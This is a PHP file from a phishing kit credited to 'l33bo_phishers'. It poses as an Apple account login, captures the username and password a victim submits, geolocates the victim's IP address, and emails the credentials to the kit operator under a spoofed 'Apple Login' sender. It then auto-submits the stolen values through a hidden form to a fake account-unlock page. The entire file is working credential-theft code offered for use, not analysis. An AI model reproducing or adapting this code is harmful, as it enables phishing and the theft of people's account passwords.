<?
/*
Created by l33bo_phishers -- icq: 695059760 
*/
require "session_protect.php";
require "functions.php";
$user_agent  = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];$GLOBALS_LOCATION=$GLOBAL.'l';
$details = json_decode(file_get_contents("http://freegeoip.net/json/".$ip.""));
$negara = $details->country_code;
$nama_negara = $details->country_name;
$kode_negara = strtolower($negara);
$kota        = $details->city;
$state        = $details->region_name;
$_SESSION['user'] = $_POST['user']; 
$_SESSION['pass'] = $_POST['pass']; 

$message   = "
|.+==========[ $$ Perawan Hunters $$ ]==========+.
|       - if money not rest we can't sleep -
|.++=========[ Account Information ]=========++.
|Username : ".$_SESSION['user']."
|Password : ".$_SESSION['pass']."
|      .++=========[ End ]=========++.
|
|      .++=======[ PC Info ]=======++.
|IP Info   		:  ".$nama_negara." - " . $state . " - " . $kota . " - " . $ip . " ]
|Browser   		:  ".$_SERVER['HTTP_USER_AGENT']."
|      .++=========[ End ]=========++.
|
|.+==========[ $$ 2K17 Never GiveUP $$ ]==========+.
";
//+++++++++++++++++++++++++++++\\ ISI PESAN //+++++++++++++++++++++++++++++\\\

include '../../CONTROLS.php';
$subject = "Account Login [ ".$nama_negara." - " . $state . " - " . $kota . " - " . $ip . " ]";
$headers = "From: Apple Login <Account@perawan.hunters>";
mail($Your_Email, $subject, $message, $headers);
?>
<form action='../locked.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' method='post' name='frm'>
<input type="hidden" name="user" value="<?php echo $_SESSION['user'];?>">
<input type="hidden" name="pass" value="<?php echo $_SESSION['pass'];?>">
</form>
<script language="JavaScript">
document.frm.submit();
</script>